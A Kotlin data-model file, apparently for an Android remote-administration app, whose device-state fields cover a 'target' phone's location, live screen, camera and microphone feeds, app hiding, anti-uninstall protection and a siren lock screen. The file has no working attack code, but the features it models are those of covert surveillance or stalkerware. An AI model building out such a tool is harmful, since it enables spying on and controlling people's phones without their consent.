package com.example.data.model

enum class ControlTab(val label: String) {
    CONTROL("CONTROL"),
    LIVE("LIVE"),
    MANAGE("MANAGE"),
    TELEMETRY("TELEMETRY"),
    CALL("CALL & INTERCOM")
}

enum class AppRole {
    ADMIN_CONSOLE,
    AGENT_CLIENT_VIEW
}

enum class CallStatus {
    IDLE,
    DIALING,
    IN_CALL,
    ENDED
}

data class DeviceState(
    val deviceId: String = "DEV-AGENT-098",
    val deviceName: String = "Galaxy S24 Ultra (Target-01)",
    val androidVersion: String = "Android 15 (API 35)",
    val batteryLevel: Int = 84,
    val isCharging: Boolean = true,
    val ipAddress: String = "185.220.101.5",
    val localIp: String = "192.168.1.108",
    val latitude: Double = 11.5564,
    val longitude: Double = 104.9282,
    val locationAddress: String = "Phnom Penh Central District, Cambodia",
    
    // Quick toggles
    val wifiEnabled: Boolean = true,
    val mobileDataEnabled: Boolean = true,
    val bluetoothEnabled: Boolean = true,
    val locationGpsEnabled: Boolean = true,
    
    // Core Controls
    val antiUninstallEnabled: Boolean = true,
    val flashlightOn: Boolean = false,
    
    // Video Playback
    val videoPlaying: Boolean = false,
    val videoUrl: String = "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
    val videoTitle: String = "Emergency Security Broadcast Stream",
    
    // Wallpaper
    val currentWallpaper: String = "https://images.unsplash.com/photo-1550745165-9bc0b252726f?w=1080",
    val wallpaperName: String = "Cyber Matrix Grid",
    
    // Lock V1 (Standard Lock)
    val isLockedV1: Boolean = false,
    val lockV1DurationMinutes: Int = 15,
    val lockV1RemainingSeconds: Long = 900L,
    
    // Lock V2 (Alarm Siren & Strobe Lock)
    val isLockedV2: Boolean = false,
    val lockV2DurationMinutes: Int = 30,
    val lockV2RemainingSeconds: Long = 1800L,
    val lockV2AdminMessage: String = "SECURITY BREACH: THIS DEVICE IS REMOTELY LOCKED BY ADMIN. ALL FUNCTIONS DISABLED.",
    val lockV2SirenActive: Boolean = true,
    val lockV2StrobeActive: Boolean = true,
    val lockV2VibrateActive: Boolean = true,
    
    // Live Feeds
    val isLiveScreenActive: Boolean = false,
    val screenFps: Int = 30,
    val isLiveCameraActive: Boolean = false,
    val isFrontCamera: Boolean = false,
    val cameraNightVision: Boolean = false,
    val isLiveAudioActive: Boolean = false,
    val adminIntercomActive: Boolean = false,
    
    // Management
    val isAppHidden: Boolean = false,
    val deviceProtected: Boolean = true,
    
    // Remote Phone Call
    val callNumber: String = "+855 12 345 678",
    val callStatus: CallStatus = CallStatus.IDLE,
    
    // Firebase Sync
    val lastSyncTimestamp: Long = System.currentTimeMillis(),
    val firebaseConnected: Boolean = true
)

data class ActivityLog(
    val id: String,
    val timestamp: String,
    val command: String,
    val status: String,
    val isAlert: Boolean = false
)
